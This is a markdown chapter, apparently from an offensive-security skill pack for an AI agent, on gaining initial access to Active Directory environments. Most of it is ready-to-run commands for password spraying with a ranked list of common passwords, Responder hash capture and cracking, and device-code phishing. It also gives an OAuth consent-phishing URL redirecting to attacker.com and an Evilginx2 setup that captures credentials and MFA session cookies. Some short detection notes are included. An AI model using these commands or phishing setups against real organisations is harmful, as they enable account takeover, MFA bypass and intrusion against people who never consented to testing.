# Phase 2: Initial Access

> Getting your first valid credentials or shell. Sometimes given for free (CTFs); often the hardest part in real engagements.

---

## Common Initial Access Vectors

| Vector | Difficulty | Realistic? |
|--------|-----------|-----------|
| Password spray | Medium | Very — works in 60%+ of orgs |
| Phishing → creds or implant | Medium-High | Standard real-world vector |
| LLMNR/NBT-NS poisoning (if on internal net) | Easy | If you have internal access |
| Exposed RDP / Citrix / RDWeb | Easy if creds | Common |
| Public-facing Exchange (ProxyShell etc.) | Easy if unpatched | CVE-dependent |
| Default / weak creds on web apps | Easy | Surprisingly common |
| Web app → SSRF / RCE → internal pivot | High | Engagement-specific |

This skill focuses on AD-specific paths. Web/phishing is its own discipline.

---

## 1. Password Spraying

> One password against many accounts, slowly, to avoid lockouts.

```bash
# Kerbrute — quietest method, uses Kerberos pre-auth
kerbrute passwordspray -d lab.local --dc 10.10.10.10 users.txt 'Spring2024!'

# Specific user list, single attempt
kerbrute passwordspray -d lab.local --dc 10.10.10.10 users.txt 'Welcome1'

# NetExec via SMB
nxc smb 10.10.10.10 -u users.txt -p 'Spring2024!' --continue-on-success
```

**Top passwords to try (in order)**:
1. `Season+Year` → `Winter2024`, `Spring2024!`
2. `Company+digit` → `Target1`, `Target2024`
3. `Welcome1`, `Welcome123`, `Welcome2024!`
4. `Password1`, `P@ssw0rd`
5. `Changeme1`, `Changeme123!`
6. Months: `October2024`

### Check lockout policy first!
```bash
# Authenticated check
nxc smb 10.10.10.10 -u jdoe -p Password1 --pass-pol

# Output you want:
#   Lockout Threshold: 0   ← no lockout, spray freely
#   Lockout Threshold: 5   ← 5 attempts; spray 1 password per round, wait observation window
#   Lockout Threshold: 10  ← safe to try a few per user
```

🔴 **OPSEC**: Even careful spraying generates Event 4625 (failed logon) on the DC for each attempt. Modern SIEMs alert on "1 password, many users, same source IP" pattern (spray heuristic).

**Detection (Blue Team)**:
- Event 4625 with `LogonType=3` from same IP across many user accounts in a short window
- Defender for Identity flags this directly as "Password spray"

---

## 2. LLMNR / NBT-NS Poisoning (Responder)

> When a Windows host can't resolve a name via DNS, it falls back to LLMNR/NBT-NS multicast. Attacker on same broadcast domain replies, captures Net-NTLMv2 hash.

```bash
# Run Responder on internal network
sudo responder -I eth0 -dwPv
# Wait. Hashes show up automatically when users mistype share names, etc.

# Crack offline
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**See `04-credential-attacks.md` § NTLM Relay for the relay variant** (more impactful than cracking).

🟡 **OPSEC**: Responder broadcasts replies — detectable with proper network monitoring (LLMNR/NBT-NS traffic is normally low). Modern Windows disables LLMNR by GPO in security-conscious orgs.

**Detection**:
- Sysmon Event 22 (DNS query) for nonexistent names followed by SMB auth
- Unusual LLMNR replies
- Defender for Identity: "Suspected DCSync attack" if relayed to DC (not this scenario, but similar telemetry)

---

## 3. Exposed RDP / Citrix / RDWeb

If you've found these from recon (Phase 1) and have creds (from spray, phish, breach data):

```bash
# RDP via xfreerdp
xfreerdp /u:jdoe /p:Password1 /d:lab.local /v:10.10.10.50 /dynamic-resolution

# Citrix StoreFront — usually weak; check for CTX-IDs that auto-launch published apps
# RDWeb — same; sometimes also reveals internal hostnames
```

---

## 4. Phishing for Creds (High-Level)

Outside this skill's scope, but common patterns:
- **Evilginx2** → proxy real O365/AD FS login, capture session token (bypasses MFA)
- **Gophish** + custom O365-looking landing page
- **HTA / .lnk / .iso** payloads with macro / C2 dropper for shell access

If user asks about phishing depth → defer to a phishing-specific skill.

---

## 5. Public-Facing Exchange / Web Vulnerabilities

CVE-specific — change yearly. Examples:
- **ProxyShell** (CVE-2021-34473) — Exchange unauth RCE → DA in one chain
- **ProxyLogon** (CVE-2021-26855) — same family
- **ADFS XML signing bugs** — token forgery

Check the target's Exchange version (in HTTP headers, `X-OWA-Version`) against MSRC advisories.

---

## Once You Have ANY Credential

Even a regular user account is enough to start internal enumeration.

→ **Phase 3: Internal Enumeration** (`03-enumeration.md`)

---

## 6. Modern Phishing Techniques (Overview)

> This section covers the high-level concepts. Deep execution belongs in a dedicated phishing skill.

### Device Code Phishing

**Concept**: OAuth2 device code flow — attacker generates a device code from Microsoft's auth endpoint and tricks a user into entering it at `microsoft.com/devicelogin`. The attacker's polling request receives a valid access token — including for M365, Azure, and Entra ID-federated resources. Bypasses MFA entirely.

```bash
# TokenTactics / TokenTacticsV2
Import-Module .\TokenTactics.psd1
Get-AzureToken -Client MSGraph      # generates device code to send to victim
# When victim authenticates → you receive their token
Invoke-RefreshToSharePointToken -Domain lab.onmicrosoft.com -refreshToken $response.refresh_token
```

**Why it works**: Device code flow is designed for devices without browsers (TVs, printers). It's legitimate — Microsoft can't easily disable it. Users don't realize entering the code gives the requester full token access.

### MFA Fatigue (Push Bombing)

**Concept**: Attacker obtains a valid username and password (via spray or breach data) and repeatedly triggers MFA push notifications. Victim, overwhelmed by notifications, approves one accidentally — or contacts helpdesk, which resets MFA.

```bash
# Requires valid creds — not a tool, a social technique
# Spray slowly to find accounts with working passwords but MFA enrolled
# Then trigger rapid MFA pushes:
# Some tools simulate this (go-evilginx, Modlishka) but it's user-driven
```

**Countermeasure**: Number matching (requires user to type a displayed number) and additional context in push notifications — patched in Authenticator app updates.

### Consent Phishing (OAuth App Registration)

**Concept**: Attacker registers a malicious Azure AD application and sends a user a crafted consent URL. If the user approves, the attacker's app receives delegated permissions (read email, files, etc.) without ever knowing the user's password. Survives password resets.

```
https://login.microsoftonline.com/<tenantID>/oauth2/authorize?
  client_id=<attacker_app_id>&response_type=code
  &redirect_uri=https://attacker.com/callback
  &scope=https://graph.microsoft.com/Mail.Read+offline_access
  &prompt=consent
```

**Impact**: Read all email, Teams messages, OneDrive files — all without the user's password and without MFA bypass. The token persists until revoked.

### Evilginx2 — Reverse Proxy Credential + Session Token Capture

**Concept**: Man-in-the-middle reverse proxy sits between the user and the real login page. Captures both the submitted credentials AND the post-MFA session cookies (refresh tokens). Bypasses MFA because the victim completes real MFA on the real site — Evilginx just intercepts everything.

```bash
# Set up phishlet for O365 / Entra ID
./evilginx2
: config domain attacker-phish.com
: config ip 10.10.10.99
: phishlets enable o365
: lures create o365
: lures get-url 0     # send this URL to victim
# After victim authenticates: sessions list
: sessions        # shows captured creds + cookies
```

